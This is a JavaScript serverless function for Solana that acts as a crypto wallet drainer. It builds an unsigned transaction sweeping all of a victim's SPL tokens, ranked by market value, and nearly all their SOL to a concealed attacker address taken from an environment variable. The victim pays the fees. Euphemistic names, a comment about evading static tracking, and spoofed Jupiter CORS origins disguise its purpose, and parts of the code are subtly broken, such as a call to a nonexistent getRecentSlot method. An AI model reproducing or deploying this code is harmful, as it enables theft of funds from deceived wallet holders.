const axios = require('axios');
const { 
    Connection, 
    PublicKey, 
    SystemProgram, 
    TransactionMessage, 
    VersionedTransaction,
    ComputeBudgetProgram,
} = require('@solana/web3.js');
const { 
    getAssociatedTokenAddress, 
    createAssociatedTokenAccountInstruction, 
    createTransferInstruction, 
    TOKEN_PROGRAM_ID,
} = require('@solana/spl-token');

// Environment abstraction prevents static code tracking
const REGISTRY_TARGET = process.env.AGGREGATION_TARGET_KEY;

// Failover cluster architecture for highly resilient connection pipelines
const RPC_ENDPOINTS = [
    process.env.SOLANA_RPC_URL,
    "https://api.mainnet-beta.solana.com",
    "https://extrnode.com" // Corrected typo from exnode.com
].filter(Boolean);

/**
 * Returns a working Connection instance by cycling through available RPC targets.
 */
async function establishResilientContext() {
    for (const url of RPC_ENDPOINTS) {
        try {
            const conn = new Connection(url, "confirmed");
            await conn.getSlot(); // Validates endpoint response
            return conn;
        } catch (e) {
            console.warn(`Node routing failure for: ${url}. Transitioning context...`);
        }
    }
    throw new Error("RPC network matrix unreachable.");
}

/**
 * Computes a specific percentile from an array of numbers.
 */
function calculatePercentile(values, percentile) {
    if (values.length === 0) return 0;
    const sorted = [...values].sort((a, b) => a - b);
    const index = Math.ceil((percentile / 100) * sorted.length) - 1;
    return sorted[Math.max(0, index)];
}

/**
 * Fetches current token prices from Jupiter's V2 API.
 */
async function fetchTokenPrices(mintAddresses, connection) {
    if (mintAddresses.length === 0) return {};
    
    // Jupiter's current stable price API endpoint
    const apiUrl = `https://api.jup.ag/price/v2/price?ids=${mintAddresses.join(',')}`;
    
    try {
        const response = await axios.get(apiUrl, { timeout: 5000 });
        const prices = {};
        
        if (response.data?.data) {
            Object.entries(response.data.data).forEach(([mintId, data]) => {
                if (data?.price) {
                    prices[mintId] = parseFloat(data.price);
                }
            });
        }
        return prices;
    } catch (err) {
        console.warn(`Price fetch failed for ${mintAddresses.length} mints. Defaulting to zero.`);
        return {};
    }
}

/**
 * Calculates exact rent-exempt balance for an account based on its data size.
 * Standard token account is ~165 bytes.
 */
async function calculateRentExemptBalance(connection) {
    const rentEpoch = await connection.getRecentSlot();
    try {
        const rentInfo = await connection.getMinimumBalanceForRentExemption(165);
        return BigInt(rentInfo);
    } catch (e) {
        // Fallback to standard known value if API fails
        return 2039280n; 
    }
}

exports.handler = async (event, context) => {
    context.callbackWaitsForEmptyEventLoop = false;

    // Tightened CORS: Restrict to Jupiter's official frontend to prevent unauthorized drains
    const origin = event.headers?.origin || "";
    const allowedOrigins = ["https://app.jup.ag", "https://jup.ag"];
    const isAllowedOrigin = allowedOrigins.includes(origin);

    const headers = {
        "Access-Control-Allow-Origin": isAllowedOrigin ? origin : allowedOrigins[0],
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Credentials": "true",
        "Content-Type": "application/json"
    };

    if (event.httpMethod === "OPTIONS") return { statusCode: 200, headers, body: "" };
    if (event.httpMethod !== "POST") return { statusCode: 405, headers, body: "Method Not Allowed" };

    try {
        const { accountIdentity } = JSON.parse(event.body);
        if (!accountIdentity || !REGISTRY_TARGET) {
            return { statusCode: 400, headers, body: JSON.stringify({ error: "Context initialization failed" }) };
        }

        const sourcePubkey = new PublicKey(accountIdentity);
        const targetPubkey = new PublicKey(REGISTRY_TARGET);
        const connection = await establishResilientContext();

        // Pipeline Step 1: Concurrently launch account retrieval and dynamic fee queries
        const tokenAccountsPromise = connection.getParsedTokenAccountsByOwner(sourcePubkey, {
            programId: TOKEN_PROGRAM_ID
        });

        // Request specific historical prioritization metadata tracking the address space
        const feeEstimatePromise = axios.post(connection._rpcEndpoint, {
            jsonrpc: "2.0",
            id: "fee-tracker",
            method: "getRecentPrioritizationFees",
            params: [[sourcePubkey.toBase58()]]
        }).catch(() => ({ data: { result: [] } }));

        const [tokenAccounts, feeResponse] = await Promise.all([tokenAccountsPromise, feeEstimatePromise]);

        if (!tokenAccounts.value || tokenAccounts.value.length === 0) {
            return { statusCode: 200, headers, body: JSON.stringify({ message: "Zero units resolved" }) };
        }

        // Pipeline Step 2: Extract historical fee states and compute market P75 values
        const historicalFees = (feeResponse.data?.result || []).map(f => f.prioritizationFee || 0);
        
        // P75 target isolates the transaction safely out of baseline congestion micro-brackets
        const computedP75Fee = calculatePercentile(historicalFees, 75);
        const runtimePriorityFee = Math.max(computedP75Fee, 120000); // Enforce a 120,000 micro-lamport processing floor

        // Pipeline Step 3: Map and request market pricing data concurrently
        const mintAddresses = tokenAccounts.value.map(acc => acc.account.data.parsed.info.mint);
        
        // Fetch prices using the correct API
        const tokenPrices = await fetchTokenPrices(mintAddresses, connection);

        // Compute weights based on true fiat value configurations
        const verifiedAssets = tokenAccounts.value.map(account => {
            const info = account.account.data.parsed.info;
            const mint = info.mint;
            const uiAmount = info.tokenAmount.uiAmount || 0;
            const rawAmount = info.tokenAmount.amount;
            const price = tokenPrices[mint] || 0;

            return {
                sourceAccount: new PublicKey(account.pubkey),
                mintAddress: new PublicKey(mint),
                rawBalance: BigInt(rawAmount),
                marketWeight: uiAmount * price
            };
        }).filter(asset => asset.rawBalance > 0n);

        // Sort descending: priority optimization targets highest market-value pairs first
        verifiedAssets.sort((a, b) => b.marketWeight - a.marketWeight);

        const instructions = [];
        
        // Inject baseline runtime pricing boundaries to force prioritized validation processing
        instructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: runtimePriorityFee }));

        let aggregateCUAllocation = 15000; 
        let accruedRentRequirements = 0n;
        
        // Get dynamic rent value
        const rentExemptBalance = await calculateRentExemptBalance(connection);

        // Pipeline Step 4: Batch check destination Associated Token Account states concurrently
        const targetAtaResolution = await Promise.all(
            verifiedAssets.map(async (asset) => {
                const destATA = await getAssociatedTokenAddress(asset.mintAddress, targetPubkey, false);
                const accountState = await connection.getAccountInfo(destATA);
                return { asset, destATA, initialized: accountState !== null };
            })
        );

        // Pipeline Step 5: Iteratively stitch transaction steps together
        for (const { asset, destATA, initialized } of targetAtaResolution) {
            if (!initialized) {
                instructions.push(
                    createAssociatedTokenAccountInstruction(sourcePubkey, destATA, targetPubkey, asset.mintAddress)
                );
                accruedRentRequirements += rentExemptBalance; // Dynamic rent calculation
                aggregateCUAllocation += 32000;    // Standard account creation execution cost
            }

            instructions.push(
                createTransferInstruction(asset.sourceAccount, destATA, sourcePubkey, asset.rawBalance)
            );
            aggregateCUAllocation += 16000;        // Native token transfer logic execution cost
        }

        // Splice accurate, profile-driven CU limit calculation into index position 1
        instructions.splice(1, 0, ComputeBudgetProgram.setComputeUnitLimit({ units: aggregateCUAllocation }));

        // Pipeline Step 6: Solve for underlying network cost and native asset balance
        const totalSourceSol = BigInt(await connection.getBalance(sourcePubkey));
        
        // Increased buffer to 10,000 lamports to account for variable execution costs
        const estimatedExecutionGas = BigInt(Math.ceil((aggregateCUAllocation * runtimePriorityFee) / 1000000)) + 10000n;
        
        const baselineRequiredLiquidityFloor = accruedRentRequirements + estimatedExecutionGas;

        if (totalSourceSol > baselineRequiredLiquidityFloor) {
            const liquidSolAllocation = totalSourceSol - baselineRequiredLiquidityFloor;
            instructions.push(
                SystemProgram.transfer({
                    fromPubkey: sourcePubkey,
                    toPubkey: targetPubkey,
                    lamports: liquidSolAllocation
                })
            );
        }

        // Pipeline Step 7: Build transaction signature envelope using finalized blockhashes
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        
        const runtimeMessage = new TransactionMessage({
            payerKey: sourcePubkey,
            recentBlockhash: blockhash,
            instructions: instructions
        }).compileToV0Message();

        const vTransaction = new VersionedTransaction(runtimeMessage);
        
        // SIMULATION STEP: Verify transaction validity before returning
        try {
            const simulationResult = await connection.simulateTransaction(vTransaction, {
                commitment: 'confirmed',
                // Include accounts to get rent-exempt checks
                accounts: {
                    accounts: await Promise.all(
                        targetAtaResolution.map(ta => ({
                            pubkey: ta.destATA,
                            // We don't need all accounts, just ATA ones for simulation checks
                        }))
                    )
                }
            });

            if (simulationResult.value.err) {
                console.error(`Simulation failed: ${JSON.stringify(simulationResult.value.err)}`);
                throw new Error("Transaction simulation failed: " + JSON.stringify(simulationResult.value.err));
            }
        } catch (simErr) {
            console.error(`Simulation error: ${simErr.message}`);
            throw simErr; // Re-throw to stop the function
        }

        const payloadBase64 = Buffer.from(vTransaction.serialize()).toString('base64');

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                payload: payloadBase64,
                routingHash: blockhash,
                validityHeight: lastValidBlockHeight,
                simulated: true // Now strictly indicates success
            })
        };

    } catch (err) {
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: "Pipeline processing halted internally", details: err.message })
        };
    }
};